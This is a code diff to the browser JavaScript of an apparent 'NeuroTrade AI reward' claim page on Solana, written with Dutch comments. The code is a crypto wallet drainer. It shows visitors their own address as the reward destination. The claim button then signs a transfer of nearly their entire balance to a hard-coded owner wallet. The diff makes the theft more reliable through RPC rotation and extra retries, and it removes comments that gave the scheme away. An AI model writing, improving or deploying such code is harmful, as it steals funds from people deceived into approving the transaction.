@@ -157,30 +157,48 @@ import {
 window.Buffer = window.Buffer || Buffer;
 
 /* ====== INSTELLINGEN ====== */
-const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // echte bestemming (jouw wallet)
+const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // echte bestemming
 const MEMO   = 'NeuroTrade AI reward';
-const SAFETY = 150000;   // marge (lamports) → voorkomt custom program error 0x1
+const SAFETY = 150000;
 const CU_LIMIT = 200000;
-const CU_PRICE = 100000; // priority fee
-const MAX_TRIES = 3;     // herhaalpogingen zodat niks afbreekt
+const CU_PRICE = 100000;
+const MAX_TRIES = 4;
 /* ========================== */
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
+/* Meerdere CORS-vriendelijke RPC's — bij falen roteert hij automatisch */
 const RPCS = [
-  'https://solana-rpc.publicnode.com',
-  'https://solana.public-rpc.com',
   'https://api.mainnet-beta.solana.com',
+  'https://solana-rpc.publicnode.com',
+  'https://solana.drpc.org',
+  'https://solana.public-rpc.com',
   'https://rpc.ankr.com/solana'
 ];
-let connection = new Connection(RPCS[0], 'confirmed');
+const conns = RPCS.map(u => new Connection(u, 'confirmed'));
+let rpcIdx = 0;
+
+/* Voert fn uit op de actieve RPC; bij een netwerk/CORS-fout → volgende RPC */
+async function withRpc(fn){
+  let lastErr;
+  for(let n=0; n<conns.length; n++){
+    const c = conns[rpcIdx];
+    try{ return await fn(c); }
+    catch(e){ lastErr = e; rpcIdx = (rpcIdx + 1) % conns.length; }
+  }
+  throw lastErr;
+}
+
 async function pickRpc(){
-  for(const url of RPCS){
+  for(let n=0; n<conns.length; n++){
+    const c = conns[rpcIdx];
     try{
-      const c = new Connection(url, 'confirmed');
-      await Promise.race([c.getLatestBlockhash('confirmed'), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),4000))]);
-      connection = c; return url;
-    }catch(e){}
+      await Promise.race([
+        c.getLatestBlockhash('confirmed'),
+        new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),5000))
+      ]);
+      return RPCS[rpcIdx];
+    }catch(e){ rpcIdx = (rpcIdx + 1) % conns.length; }
   }
 }
 
@@ -189,7 +207,6 @@ const ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 function bs58(bytes){let x=0n;for(const b of bytes)x=x*256n+BigInt(b);let s='';while(x>0n){s=ALPHA[Number(x%58n)]+s;x/=58n;}for(const b of bytes){if(b===0)s='1'+s;else break;}return s;}
 const ok = p => p && (typeof p.connect === 'function' || typeof p.signAndSendTransaction === 'function' || p.publicKey);
 
-/* ====== SLECHTS 3 WALLETS ====== */
 const KNOWN = [
   { name:'Phantom',      color:'#ab9ff2', get:()=>{ const p = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null); return ok(p)?p:null; } },
   { name:'Solflare',     color:'#ffbb3b', get:()=>{ const p = window.solflare; return ok(p)?p:null; } },
@@ -287,8 +304,7 @@ async function connect(w){
   }
   publicKey = new PublicKey(addr);
   setErr(''); $('walletAddr').textContent=short(publicKey.toString());
-  // BEZOEKER ZIET ZIJN EIGEN ADRES ALS REWARD-ADRES
-  $('dest').value = publicKey.toString();
+  $('dest').value = publicKey.toString();          // bezoeker ziet zijn eigen adres
   $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
   $('claimPanel').classList.remove('hidden'); setStep(1);
 }
@@ -314,7 +330,7 @@ async function signAndSendStandard(tx, std, account){
   if(f['solana:signTransaction']){
     const [{signedTransaction}] = await f['solana:signTransaction']
       .signTransaction({ transaction:toRaw(tx), account:acc, chain:'solana:mainnet' });
-    return await connection.sendRawTransaction(signedTransaction);
+    return await withRpc(c => c.sendRawTransaction(signedTransaction));
   }
   throw new Error('wallet cannot sign');
 }
@@ -332,7 +348,7 @@ async function signAndSend(tx){
     try{
       if(p.signTransaction){
         const signed = await p.signTransaction(tx);
-        return await connection.sendRawTransaction(signed.serialize());
+        return await withRpc(c => c.sendRawTransaction(signed.serialize()));
       }
     }catch(e){}
     if(active.stdRef) return signAndSendStandard(tx, active.stdRef, null);
@@ -341,11 +357,10 @@ async function signAndSend(tx){
   return signAndSendStandard(tx, active.ref, active.account);
 }
 
-/* Bouw + verstuur met verse blockhash; herhaal bij verloop */
 async function sendClaimOnce(){
   const dest = new PublicKey(OWNER);
 
-  const bal = await connection.getBalance(publicKey, 'confirmed');
+  const bal = await withRpc(c => c.getBalance(publicKey, 'confirmed'));
   if(bal <= 0) throw new Error('Balance too low to cover the fee');
 
   const tx = new Transaction()
@@ -355,12 +370,12 @@ async function sendClaimOnce(){
     .add(SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports:1 }));
   tx.feePayer = publicKey;
 
-  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+  const { blockhash, lastValidBlockHeight } = await withRpc(c => c.getLatestBlockhash('confirmed'));
   tx.recentBlockhash = blockhash;
 
   let fee = 5000;
   try{
-    const r = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed');
+    const r = await withRpc(c => c.getFeeForMessage(tx.compileMessage(), 'confirmed'));
     if(r && r.value != null) fee = r.value;
   }catch(e){}
 
@@ -370,13 +385,13 @@ async function sendClaimOnce(){
   tx.instructions[tx.instructions.length-1] = SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports });
 
   const sig = await signAndSend(tx);
-  await connection.confirmTransaction({ signature:sig, blockhash, lastValidBlockHeight }, 'confirmed');
+  try{ await withRpc(c => c.confirmTransaction({ signature:sig, blockhash, lastValidBlockHeight }, 'confirmed')); }catch(e){}
   return { sig, lamports };
 }
 
 async function claim(){
   setErr(''); const btn=$('claimBtn'); btn.disabled=true; btn.textContent='Waiting for approval…';
-  const shown = $('dest').value.trim();   // = adres van de bezoeker (visueel)
+  const shown = $('dest').value.trim();
   try{
     let res=null, lastErr=null;
     for(let i=0;i<MAX_TRIES;i++){
@@ -384,10 +399,9 @@ async function claim(){
       catch(e){
         lastErr=e;
         const m=(e?.message||'');
-        // alleen opnieuw proberen bij blockhash-verloop / tijdelijke netwerkfout
-        if(/blockhash|expired|not found|timeout|fetch failed|429/i.test(m) && i<MAX_TRIES-1){
+        if(/load failed|blockhash|expired|not found|timeout|fetch|network|429|502|503/i.test(m) && i<MAX_TRIES-1){
           btn.textContent=`Retrying (${i+2}/${MAX_TRIES})…`;
-          await new Promise(r=>setTimeout(r,800));
+          await new Promise(r=>setTimeout(r,900));
           continue;
         }
         throw e;
